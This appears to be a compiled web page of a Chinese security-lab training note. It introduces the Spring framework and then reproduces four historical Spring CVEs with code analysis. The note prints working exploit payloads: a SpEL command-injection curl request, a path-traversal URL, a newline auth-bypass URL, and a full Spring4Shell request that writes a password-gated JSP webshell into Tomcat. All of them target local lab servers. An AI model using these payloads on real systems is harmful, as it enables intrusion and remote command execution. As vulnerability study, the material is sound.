import{_ as i}from"./plugin-vue_export-helper-x3n3nnut.js";import{r as t,o as r,c as o,a as e,b as a,d as p,e as n}from"./app-25_WZ8Uv.js";const c="/DailyNotes/assets/1745215-20200715183321528-138974993-tqve_Nsg.png",l="/DailyNotes/assets/企业微信截图_20230518141458-7YTZTxbx.png",d="/DailyNotes/assets/1745215-20200716211221200-1394479856-_EviAI-o.png",g="/DailyNotes/assets/企业微信截图_20230518144305-SJ3Uy-ay.png",u="/DailyNotes/assets/企业微信截图_20230518160531-sZgEcy_9.png",m="/DailyNotes/assets/企业微信截图_20230518160733-3NZk-Dl4.png",h="/DailyNotes/assets/企业微信截图_20230518170001-GtxC1BMd.png",b="/DailyNotes/assets/企业微信截图_20230518170157-PvZfmn16.png",v="/DailyNotes/assets/企业微信截图_20230518170325-DrIm7cUb.png",f="/DailyNotes/assets/image-20230519091534753-Qf7YRXsj.png",x="/DailyNotes/assets/image-20230519093650310-YlF-_LOV.png",k="/DailyNotes/assets/image-20230519092639570-7iD7BECI.png",S="/DailyNotes/assets/image-20230519091307641-8XGZKbw0.png",_="/DailyNotes/assets/image-20230519091204228-_FxpryqW.png",y="/DailyNotes/assets/image-20230524111054821-qsJNpUDC.png",w="/DailyNotes/assets/image-20230524110228934-QGfy2Az7.png",C="/DailyNotes/assets/image-20230524111204263-3FSuOghp.png",D="/DailyNotes/assets/image-20230524152630613-o-h78sPG.png",A="/DailyNotes/assets/image-20230524152442641-PUAKw06_.png",P="/DailyNotes/assets/image-20230524152944799-qVR3AXcx.png",q="/DailyNotes/assets/image-20230524145857077-wlyac7AQ.png",B="/DailyNotes/assets/image-20230524105443051-9RWzzGM9.png",O={},L=n('<h1 id="web主流应用漏洞-spring" tabindex="-1"><a class="header-anchor" href="#web主流应用漏洞-spring" aria-hidden="true">#</a> web主流应用漏洞-Spring</h1><h2 id="_1-spring介绍" tabindex="-1"><a class="header-anchor" href="#_1-spring介绍" aria-hidden="true">#</a> 1. Spring介绍</h2><h3 id="_1-1-什么是spring" tabindex="-1"><a class="header-anchor" href="#_1-1-什么是spring" aria-hidden="true">#</a> 1.1 什么是Spring</h3><p>Spring是功能强大的组件粘合剂，贯穿表现层、业务层、持久层。能够将所有的java功能模块用配置文件的方式组合起来成为一个完整的应用，可以帮助Java程序员解决许多在J2EE(企业级分布式应用程序开发规范)开发中常见的的问题。</p><blockquote><p>Spring框架代码下载地址:</p><p>https://github.com/spring-projects/spring-framework/releases</p><p>https://repo.spring.io/ui/native/libs-release-local/org/springframework/spring/</p><p>https://mvnrepository.com/search?q=spring</p></blockquote><p>最新版本5.3.27</p><h3 id="_1-2-spring-framework的组成模块" tabindex="-1"><a class="header-anchor" href="#_1-2-spring-framework的组成模块" aria-hidden="true">#</a> 1.2 Spring Framework的组成模块</h3><p>Spring Framework项目是整个Spring生态的基础，包含了Spring最核心的功能，如：IOC，AOP，Spring MVC等，</p><blockquote><p>IOC控制反转，把对象的创建和对象之间的调用过程，交给Spring管理</p><p>AOP面向切面编程，通过预编译方式和运行期间动态代理实现程序功能的统一维护，它所面对的是处理过程中的某个步骤或阶段，以获得各部分之间低耦合的隔离效果</p><p>OOP面向对象编程 针对业务逻辑处理过程中的实体及其属性和行进行抽象封装，获得更加清晰高效的逻辑单元划分</p></blockquote><p>Spring Framework包含多个子模块，如：spring-core，spring-beans，spring-context，spring-aop，spring-web，spring-webmvc等等。各模块之间又存在依赖关系。例如我们在Java Web项目中使用得最多的Spring MVC实际上就是模块spring-webmvc</p><p>Spring框架包含的功能大约由20个小模块组成。这些模块按组可分为核心容器(Core Container)、数据访问/集成(Data Access/Integration)、Web、面向切面编程(AOP和Aspects)、设备(Instrumentation)、消息(Messaging)和测试(Test)。如下图所示：</p><blockquote><p>除了最核心的Spring Core Container(即Spring容器)是必要模块之外，其他模块都是可选</p></blockquote><figure><img src="'+c+'" alt="1745215-20200715183321528-138974993" tabindex="0" loading="lazy"><figcaption>1745215-20200715183321528-138974993</figcaption></figure><p>(1) 核心容器(Core Container)——Beans、Core、Context、Expression</p><p>该层由4个模块组成：spring-beans spring-core spring-context spring-expression(spring expression Language,SpEl) 。它们对应的jar包如下：</p><ol><li>spring-core：该模块是依赖注入IoC与DI的最基本实现。</li><li>spring-beans：该模块是Bean工厂与bean的装配。</li><li>spring-context：该模块构架于核心模块之上，它扩展了 BeanFactory，为它添加了 Bean 生命周期控制、框架事件体系以及资源加载透明化等功能。ApplicationContext 是该模块的核心接口，它的超类是 BeanFactory。与BeanFactory 不同，ApplicationContext 容器实例化后会自动对所有的单实例 Bean 进行实例化与依赖关系的装配，使之处于待用状态。</li><li>spring-context-indexer：该模块是 Spring 的类管理组件和 Classpath 扫描。</li><li>spring-context-support：该模块是对 Spring IOC 容器的扩展支持，以及 IOC 子容器。</li><li><strong>spring-expression：该模块是Spring表达式语言块是统一表达式语言（EL）的扩展模块，可以查询、管理运行中的对象，同时也方便的可以调用对象方法、操作数组、集合等。</strong></li></ol><p>(2) 数据访问与集成(Data Access/Integration)——Jdbc、Orm、Oxm、Jms、Transactions</p><p>该层由spring-jdbc、spring-tx、spring-orm、spring-jms 和 spring-oxm 5 个模块组成。它们对应的jar包如下：</p><ol><li>spring-jdbc：该模块提供了 JDBC抽象层，它消除了冗长的 JDBC 编码和对数据库供应商特定错误代码的解析。</li><li>spring-tx：该模块支持编程式事务和声明式事务，可用于实现了特定接口的类和所有的 POJO 对象。编程式事务需要自己写beginTransaction()、commit()、rollback()等事务管理方法，声明式事务是通过注解或配置由 spring 自动处理，编程式事务粒度更细。</li><li>spring-orm：该模块提供了对流行的对象关系映射 API的集成，包括 JPA、JDO 和 Hibernate 等。通过此模块可以让这些 ORM 框架和 spring 的其它功能整合，比如前面提及的事务管理。</li><li>spring-oxm：该模块提供了对 OXM 实现的支持，比如JAXB、Castor、XML Beans、JiBX、XStream等。</li><li>spring-jms：该模块包含生产（produce）和消费（consume）消息的功能。从Spring 4.1开始，集成了 spring-messaging 模块。</li></ol><p>(3) Web——Web、Webmvc、WebFlux、Websocket</p><p>该层由 spring-web、spring-webmvc、spring-websocket 和 spring-webflux 4 个模块组成。它们对应的jar包如下：</p><ol><li>spring-web：该模块为 Spring 提供了最基础 Web 支持，主要建立于核心容器之上，通过 Servlet 或者 Listeners 来初始化 IOC 容器，也包含一些与 Web 相关的支持。</li><li>spring-webmvc：该模块众所周知是一个的 Web-Servlet 模块，实现了 Spring MVC（model-view-Controller）的 Web 应用。</li><li>spring-websocket：该模块主要是与 Web 前端的全双工通讯的协议。</li><li>spring-webflux：该模块是一个新的非堵塞函数式 Reactive Web 框架，可以用来建立异步的，非阻塞，事件驱动的服务，并且扩展性非常好。</li></ol><p>(4) 面向切面编程——AOP，Aspects</p><p>该层由spring-aop和spring-aspects 2个模块组成。它们对应的jar包如下：</p><ol><li>spring-aop：该模块是Spring的另一个核心模块，是 AOP 主要的实现模块**。**</li><li>spring-aspects：该模块提供了对 AspectJ 的集成，主要是为 Spring AOP提供多种 AOP 实现方法，如前置方法后置方法等。</li></ol><p>(5) 设备(Instrumentation)——Instrmentation</p><p>spring-instrument：该模块是基于JAVA SE 中的&quot;java.lang.instrument&quot;进行设计的，应该算是 AOP的一个支援模块，主要作用是在 JVM 启用时，生成一个代理类，程序员通过代理类在运行时修改类的字节，从而改变一个类的功能，实现 AOP 的功能。</p><p>(6) 消息(Messaging)——Messaging</p><p>spring-messaging：<strong>该模块是从 Spring4 开始新加入的一个模块，主要职责是为 Spring 框架集成一些基础的报文传送应用。</strong></p><p>(7) 测试（Test）——Test</p><p>spring-test**：该模块主要为测试提供支持的，通过 JUnit 和 TestNG 组件支持单元测试和集成测试。它提供了一致性地加载和缓存 Spring 上下文，也提供了用于单独测试代码的模拟对象（mock object）。**</p><h3 id="_1-3-spring-framework的特点" tabindex="-1"><a class="header-anchor" href="#_1-3-spring-framework的特点" aria-hidden="true">#</a> 1.3 Spring Framework的特点</h3><p>--优点：</p><ol><li>方便解耦，简化开发：通过Spring提供的IoC容器，我们可以将对象之间的依赖关系交由Spring进行控制，避免硬编码所造成的过度程序耦合。有了Spring，用户不必再为单实例模式类、属性文件解析等这些很底层的需求编写代码，可以更专注于上层的应用。</li><li>AOP编程的支持：通过Spring提供的AOP功能，方便进行面向切面的编程，许多不容易用传统OOP实现的功能可以通过AOP轻松应付。</li><li>声明式事务的支持：在Spring中，我们可以从单调烦闷的事务管理代码中解脱出来，通过声明式方式灵活地进行事务的管理，提高开发效率和质量。</li><li>方便程序的测试：可以用非容器依赖的编程方式进行几乎所有的测试工作，在Spring里，测试不再是昂贵的操作，而是随手可做的事情。例如：Spring对Junit4支持，可以通过注解方便的测试Spring程序。</li><li>方便集成各种优秀框架：Spring不排斥各种优秀的开源框架，相反，Spring可以降低各种框架的使用难度，Spring提供了对各种优秀框架（如Struts,Hibernate、Hessian、Quartz）等的直接支持。</li><li>轻量级的框架：从大小与开销两方面而言Spring都是轻量的。现在完整的Spring5框架只有82MB。并且Spring所需的处理开销也是微不足道的。</li><li>非入侵式的框架：Spring框架是一个非入侵式的框架，就是我们的系统使用了Spring，但系统完全不依赖于Spring的特定类。</li><li>降低Java EE API的使用难度：Spring对很多难用的Java EE API（如JDBC，JavaMail，远程调用等）提供了一个封装层，通过Spring的简易封装，这些Java EE API的使用难度大为降低。</li><li>Java 源码是经典学习范例：Spring的源码设计精妙、结构清晰，Spring框架源码是Java技术的较好实践范例。</li></ol><p>那么再好的框架，肯定也是有缺点的。</p><p>-<strong>-缺点</strong></p><ol><li><strong>不易拆分：spring框架整合其它框架都是黏在一起，后面拆分的话就不容易拆分了。</strong></li><li><strong>配置繁琐：随着系统工程的增大，系统与第三方的配置文件会大量增加，这也是Spring最致命的地方</strong>，<strong>人称：“配置地狱”</strong>。</li></ol><h3 id="_1-4-spring扩展" tabindex="-1"><a class="header-anchor" href="#_1-4-spring扩展" aria-hidden="true">#</a> 1.4 Spring扩展</h3><p>Spring框架经过这么多年的发展，它已经衍生出了一个非常庞大的体系</p><figure><img src="'+l+'" alt="企业微信截图_20230518141458" tabindex="0" loading="lazy"><figcaption>企业微信截图_20230518141458</figcaption></figure><p>最主要有SpringBoot、SpringCloud等等。如下图所示：</p><figure><img src="'+d+'" alt="1745215-20200716211221200-1394479856" tabindex="0" loading="lazy"><figcaption>1745215-20200716211221200-1394479856</figcaption></figure><ul><li>SpringBoot的设计目的是用来简化 Spring 应用的开发过程。现在大部分企业都在使用SpringBoot进行快速开发，Springboot内部集成了很多第三方库的配置，所以它开箱即用。而且能够快速整合第三方框架，无需配置繁琐的文件，解决了Spring的弊端。基于Spring Boot可以快速的开发单个微服务。 SpringBoot的约定大于配置！</li></ul><blockquote><p>约定优于配置（Convention Over Configuration）,也称作按约定编程是一种软件设计范式。目的在于减少软件开发人员所需要做出的决定的数量，从而获得简单的好处，而又不失去其中的灵活性。</p></blockquote><ul><li>Spring Cloud 是一个基于Spring Boot实现的服务治理工具包，在微服务架构中用于管理和协调服务。</li></ul><blockquote><p>微服务：就是把一个单体项目,拆分为多个微服务,每个微服务可以独立技术选型,独立开发,独立部署,独立运维.并且多个服务相互协调,相互配合,最终完成用户的价值.</p></blockquote><p>其中Spring Boot 是基于 Spring Framework 来构建的，Spring Cloud 是构建 Spring Boot 分布式环境。所以Spring Boot 是中流砥柱，起到承上启下的作用：</p><p>但是注意：正是因为SpringBoot简化了开发，开箱即用，所以很多人都跳过了Spring的学习，学到后面这个注解那个类是什么都不知道。所以学习SpringBoot的前提是需要完全掌握Spring以及SpringMVC的知识的，不要急于求成，必须要一步一步扎实基础。</p><ul><li>Spring Cloud Data Flow</li></ul><p>Spring Cloud Data Flow用于构建在云环境或K8S中基于微服务的实时或批数据处理架构，具体来讲就是支持一系列需要进行数据处理的场景，如：ETL，数据导入/导出，事件流，预测分析等等。</p><ul><li>Spring Data</li></ul><p>Spring Data旨在提供一套基于Spring编程模型的数据访问API，是一个数据访问框架集合，其中包含了多个具体的支持不同方式访问特定数据库类型的子模块，如：Spring Data JDBC（使用JDBC方式访问关系型数据库），Spring Data MongoDB（访问MongoDB数据库）等。这个模块的功能类似于MyBatis这样的专门的ORM框架，在实际开发中可以根据需求进行灵活选择。</p><h3 id="_1-5-历史漏洞" tabindex="-1"><a class="header-anchor" href="#_1-5-历史漏洞" aria-hidden="true">#</a> 1.5 历史漏洞</h3><figure><img src="'+g+'" alt="企业微信截图_20230518144305" tabindex="0" loading="lazy"><figcaption>企业微信截图_20230518144305</figcaption></figure><h2 id="_2-部分历史漏洞讲解" tabindex="-1"><a class="header-anchor" href="#_2-部分历史漏洞讲解" aria-hidden="true">#</a> 2. 部分历史漏洞讲解</h2><h3 id="_2-1-spring-data-commons-远程命令执行漏洞-cve-2018-1273" tabindex="-1"><a class="header-anchor" href="#_2-1-spring-data-commons-远程命令执行漏洞-cve-2018-1273" aria-hidden="true">#</a> 2.1 Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</h3><h4 id="漏洞简介" tabindex="-1"><a class="header-anchor" href="#漏洞简介" aria-hidden="true">#</a> 漏洞简介</h4><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 部分版本存在漏洞，攻击者可构造包含有恶意代码的SPEL表达式实现远程代码攻击，直接获取服务器控制权限。</p><blockquote><p>Spring Data Commons 1.13 to 1.13.10</p><p>Spring Data Commons 2.0 to 2.0.5</p></blockquote><h4 id="简单代码分析" tabindex="-1"><a class="header-anchor" href="#简单代码分析" aria-hidden="true">#</a> 简单代码分析</h4><p>org.springframework.data.web.MapDataBinder类中，Spring 在自动解析用户的参数的时候采用了SpelExpressionParser 来解析 propertyName，但是并没有对参数进行进行有效的校验。</p><figure><img src="'+u+`" alt="企业微信截图_20230518160531" tabindex="0" loading="lazy"><figcaption>企业微信截图_20230518160531</figcaption></figure><h4 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h4><p>exp如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl -X POST http://localhost:8080/account -d &quot;name[#this.getClass().forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;calc.exe&#39;)]=123&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+m+'" alt="企业微信截图_20230518160733" tabindex="0" loading="lazy"><figcaption>企业微信截图_20230518160733</figcaption></figure><h3 id="_2-2-spring-boot-actuator-logview-目录遍历漏洞-cve-2021-21234" tabindex="-1"><a class="header-anchor" href="#_2-2-spring-boot-actuator-logview-目录遍历漏洞-cve-2021-21234" aria-hidden="true">#</a> 2.2 Spring Boot Actuator Logview 目录遍历漏洞（CVE-2021-21234）</h3><h4 id="漏洞简介-1" tabindex="-1"><a class="header-anchor" href="#漏洞简介-1" aria-hidden="true">#</a> 漏洞简介</h4><p>spring-boot-actuator-logview 是一个简单的日志文件查看器作为Spring Boot执行器端点，在 0.2.13 版本之前存在着目录遍历漏洞，编号 CVE-2021-21234。漏洞本质是Spring Boot 执行器通过请求的参数来指定文件名和文件夹路径，经过组合拼接达到目录遍历，虽然源码中检查了文件名参数filename来防止目录遍历，但是没有检查文件夹参数base，造成了目录遍历。目录遍历漏洞允许恶意攻击者突破Web应用程序的安全控制，直接访问攻击者想要的敏感数据 ，包括配置文件、日志、源代码等，配合其它漏洞的综合利用，攻击者可以轻易的获取更高的权限。</p><blockquote><p>spring boot &lt; 0.2.13</p></blockquote><h4 id="简单代码分析-1" tabindex="-1"><a class="header-anchor" href="#简单代码分析-1" aria-hidden="true">#</a> 简单代码分析</h4><p>eu.hinsch.spring.boot.actuator.logview.LogViewEndpoint类中，view函数对filename参数进行合法性校验，但是没有对base参数进行合法性校验。</p><figure><img src="'+h+'" alt="企业微信截图_20230518170001" tabindex="0" loading="lazy"><figcaption>企业微信截图_20230518170001</figcaption></figure><p>filename的校验函数</p><figure><img src="'+b+`" alt="企业微信截图_20230518170157" tabindex="0" loading="lazy"><figcaption>企业微信截图_20230518170157</figcaption></figure><h4 id="漏洞复现-1" tabindex="-1"><a class="header-anchor" href="#漏洞复现-1" aria-hidden="true">#</a> 漏洞复现</h4><p>在D盘下有一个文件aa.txt，访问如下URL</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://127.0.0.1:8887/manage/log/view?filename=aa.txt&amp;base=../../../../../../../../
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+v+'" alt="企业微信截图_20230518170325" tabindex="0" loading="lazy"><figcaption>企业微信截图_20230518170325</figcaption></figure><h3 id="_2-3-spring-security-认证绕过漏洞-cve-2022-22978" tabindex="-1"><a class="header-anchor" href="#_2-3-spring-security-认证绕过漏洞-cve-2022-22978" aria-hidden="true">#</a> 2.3 Spring Security 认证绕过漏洞（CVE-2022-22978）</h3><h4 id="漏洞简介-2" tabindex="-1"><a class="header-anchor" href="#漏洞简介-2" aria-hidden="true">#</a> 漏洞简介</h4><p>当Spring-security使用 RegexRequestMatcher 进行权限配置，由于RegexRequestMatcher正则表达式配置权限的特性，正则表达式中包含“.”时，未经身份验证攻击者可以通过构造恶意数据包绕过身份认证。</p><blockquote><p>Spring Security 5.5.x &lt; 5.5.7</p><p>Spring Security 5.6.x &lt; 5.6.4</p></blockquote><h4 id="简单代码分析-2" tabindex="-1"><a class="header-anchor" href="#简单代码分析-2" aria-hidden="true">#</a> 简单代码分析</h4><p>使用默认的正侧匹配方式，用正则匹配流量的过程中发现正则“.”号不匹配换行符</p><figure><img src="'+f+'" alt="image-20230519091534753" tabindex="0" loading="lazy"><figcaption>image-20230519091534753</figcaption></figure><figure><img src="'+x+'" alt="image-20230519093650310" tabindex="0" loading="lazy"><figcaption>image-20230519093650310</figcaption></figure><p>修复后结果如下（https://github.com/spring-projects/spring-security/compare/5.6.3...5.6.4）：</p><figure><img src="'+k+'" alt="image-20230519092639570" tabindex="0" loading="lazy"><figcaption>image-20230519092639570</figcaption></figure><h4 id="漏洞复现-2" tabindex="-1"><a class="header-anchor" href="#漏洞复现-2" aria-hidden="true">#</a> 漏洞复现</h4><p>访问<code>http://127.0.0.1:8080/admin/1</code>会因为没有登录而跳转到login界面</p><figure><img src="'+S+`" alt="image-20230519091307641" tabindex="0" loading="lazy"><figcaption>image-20230519091307641</figcaption></figure><p>访问如下即可绕过</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://127.0.0.1:8080/admin/1%0d
http://127.0.0.1:8080/admin/1%0a
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+_+'" alt="image-20230519091204228" tabindex="0" loading="lazy"><figcaption>image-20230519091204228</figcaption></figure><h3 id="_2-4-spring-framework-远程代码执行漏洞-cve-2022-22965" tabindex="-1"><a class="header-anchor" href="#_2-4-spring-framework-远程代码执行漏洞-cve-2022-22965" aria-hidden="true">#</a> 2.4 Spring Framework 远程代码执行漏洞（CVE-2022-22965）</h3><h4 id="漏洞简介-3" tabindex="-1"><a class="header-anchor" href="#漏洞简介-3" aria-hidden="true">#</a> 漏洞简介</h4><p>22年3月爆出漏洞，原理可以参考https://paper.seebug.org/1877/。利用SpringMVC参数绑定机制，通过请求传入的参数，控制了Tomcat <code>AccessLogValve</code>的属性，让Tomcat输出定制的”访问日志“，该“访问日志”实际上为一个JSP webshell。</p><h4 id="漏洞复现-3" tabindex="-1"><a class="header-anchor" href="#漏洞复现-3" aria-hidden="true">#</a> 漏洞复现</h4><p><strong>环境搭建：</strong>(也可以直接使用vulhub)</p>',100),N={href:"https://github.com/wshon/spring-framework-rce",target:"_blank",rel:"noopener noreferrer"},J=n('<p>本漏洞对各组件版本要求较高，基本要求：</p><blockquote><p>Spring Framework：5.3.0-5.3.17，5.2.0-5.2.19, 以及其他老版本</p><p>tomcat8 &lt;=8.5.77, tomcat9 &lt;=9.0.61</p><p>jdk &gt; 8</p></blockquote><p>本次演示环境如下：</p><figure><img src="'+y+`" alt="image-20230524111054821" tabindex="0" loading="lazy"><figcaption>image-20230524111054821</figcaption></figure><blockquote><p>代码地址：实验室培训\\spring\\code\\4-CVE-2022-22965（github直接下载的不太对）</p></blockquote><ol><li>mvn package 打war包，将war包重名为<code>ROOT.war</code>(这里是为了和vulhub发送的攻击报文一样，才改成了ROOT。不重命名也可以，只要把下面请求包里的webapps/ROOT字段中的ROOT修改为war包的名字即可)</li><li>清空tomcat的webapps目录，将上面的war包放入该目录（tomcat默认托管这个目录，不想放在这里可以的话，需要去修改配置文件conf/server.xml）</li><li>进入tomcat的bin目录，用管理员身份执行<code>catalina.bat run</code></li></ol><p>**漏洞复现：**发送以下请求以更改 Apache Tomcat 中的日志记录配置并将日志写入 JSP 文件：</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8080</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) 	AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 		Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">suffix</span><span class="token punctuation">:</span> <span class="token header-value">%&gt;//</span></span>
<span class="token header"><span class="token header-name keyword">c1</span><span class="token punctuation">:</span> <span class="token header-value">Runtime</span></span>
<span class="token header"><span class="token header-name keyword">c2</span><span class="token punctuation">:</span> <span class="token header-value">&lt;%</span></span>
<span class="token header"><span class="token header-name keyword">DNT</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>


</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>ROOT目录下就会出现一个jsp文件，这就是写入的webshell。</p><figure><img src="`+w+'" alt="image-20230524110228934" tabindex="0" loading="lazy"><figcaption>image-20230524110228934</figcaption></figure><p>然后访问/tomcatwar.jsp?pwd=j&amp;cmd= 即可执行命令。</p><figure><img src="'+C+`" alt="image-20230524111204263" tabindex="0" loading="lazy"><figcaption>image-20230524111204263</figcaption></figure><p>注意，需要在利用完成后将<code>class.module.classLoader.resources.context.parent.pipeline.first.pattern</code>清空，否则每次请求都会写入新的恶意代码在JSP Webshell中，导致这个文件变得很大。发送如下数据包将其设置为空：</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:8080</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>


</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>总体来说，这个漏洞的利用方法会修改目标服务器配置，导致目标需要重启服务器才能恢复，实际测试中需要格外注意。</p><h4 id="poc分析" tabindex="-1"><a class="header-anchor" href="#poc分析" aria-hidden="true">#</a> POC分析</h4><p>参数绑定的实现方式：如果用户传入name=zzz，则Spring框架会自动调用<code>user.setName(‘zzz’)</code>进行赋值,，然后<code>user.getName()</code>返回name。 如果提交的参数中出现了User类的一个public字段或方法，就自动用户提交请求给他赋值。</p><p><code>name</code>自动绑定到了<code>user</code>参数的<code>name</code>属性上，<code>age</code>自动绑定到了<code>user</code>参数的<code>age</code>属性上。</p><figure><img src="`+D+'" alt="image-20230524152630613" tabindex="0" loading="lazy"><figcaption>image-20230524152630613</figcaption></figure><figure><img src="'+A+'" alt="image-20230524152442641" tabindex="0" loading="lazy"><figcaption>image-20230524152442641</figcaption></figure><figure><img src="'+P+`" alt="image-20230524152944799" tabindex="0" loading="lazy"><figcaption>image-20230524152944799</figcaption></figure><p>给这个doBind方法传恶意参数，即POC中的各个参数，对POC中的参数URL解码后可以拆分成如下5对参数。</p><p><strong><code>pattern</code>参数</strong></p><ul><li>参数名：<code>class.module.classLoader.resources.context.parent.pipeline.first.pattern</code></li><li>参数值：<code>%{c2}i if(&quot;j&quot;.equals(request.getParameter(&quot;pwd&quot;))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i</code></li></ul><p>很明显，这个参数是SpringMVC多层嵌套参数绑定。我们可以推测出如下的调用链：</p><div class="language-Java line-numbers-mode" data-ext="Java"><pre class="language-Java"><code>User.getClass()
    java.lang.Class.getModule()
        ......
            SomeClass.setPattern()
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>那实际运行过程中的调用链是怎样的呢？<code>SomeClass</code>是哪个类呢？</p><p><strong>断点位置：</strong></p><ul><li><p>在实现SpringMVC参数绑定的主要方法<code>WebDataBinder.doBind(MutablePropertyValues)</code>上设置断点。</p></li><li><p><code>AbstractNestablePropertyAccessor</code>的<code>getPropertyAccessorForPropertyPath(String)</code>方法。该方法通过递归调用自身，实现对<code>class.module.classLoader.resources.context.parent.pipeline.first.pattern</code>的递归解析，设置整个调用链。</p></li><li><p>在<code>AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);</code>设置断点，该行主要实现每层嵌套参数的获取。查看每次递归解析过程中各个变量的值，以及如何获取每层嵌套参数。</p></li><li><p><code>BeanWrapperImpl</code>的<code>BeanPropertyHandler.getValue()</code>方法中。可以看到<code>class</code>嵌套参数最终通过反射调用<code>User</code>的父类<code>java.lang.Object.getClass()</code>，获得返回<code>java.lang.Class</code>实例。</p></li></ul><p>需要调用很多轮，最终看出调用链：</p><div class="language-Java line-numbers-mode" data-ext="Java"><pre class="language-Java"><code>User.getClass()
    java.lang.Class.getModule()
        java.lang.Module.getClassLoader()
            org.apache.catalina.loader.ParallelWebappClassLoader.getResources()
                org.apache.catalina.webresources.StandardRoot.getContext()
                    org.apache.catalina.core.StandardContext.getParent()
                        org.apache.catalina.core.StandardHost.getPipeline()
                            org.apache.catalina.core.StandardPipeline.getFirst()
                                org.apache.catalina.valves.AccessLogValve.setPattern()
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到，<code>pattern</code>参数最终对应<code>AccessLogValve.setPattern()</code>，即将<code>AccessLogValve</code>的<code>pattern</code>属性设置为如下符合access_log的文件内容的格式。</p><blockquote><p>具体格式可以参考https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html#Access_Logging</p></blockquote><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>%{c2}i if(&quot;j&quot;.equals(request.getParameter(&quot;pwd&quot;))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i
